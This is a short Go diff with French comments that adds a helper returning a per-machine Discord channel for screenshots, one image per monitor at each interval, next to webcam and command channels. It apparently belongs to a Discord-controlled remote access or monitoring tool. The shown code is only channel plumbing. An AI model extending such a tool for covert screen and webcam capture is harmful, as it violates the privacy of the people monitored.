@@ -259,6 +259,20 @@ func webcamChannel() string {
 	return ""
 }
 
+// screenshotsChannel renvoie le salon des captures d'écran
+// (`<machine>-screenshots`). Il reçoit une image par moniteur à chaque
+// cadence, sans polluer le salon de commande.
+func screenshotsChannel() string {
+	id, done := namedChannel(hostChannelName() + "-screenshots")
+	if id != "" {
+		return id
+	}
+	if done {
+		return targetChannel()
+	}
+	return ""
+}
+
 // hostChannelName fabrique un nom de salon acceptable par Discord à partir du
 // nom de la machine : minuscules, [a-z0-9._-], 100 caractères maximum.
 func hostChannelName() string {
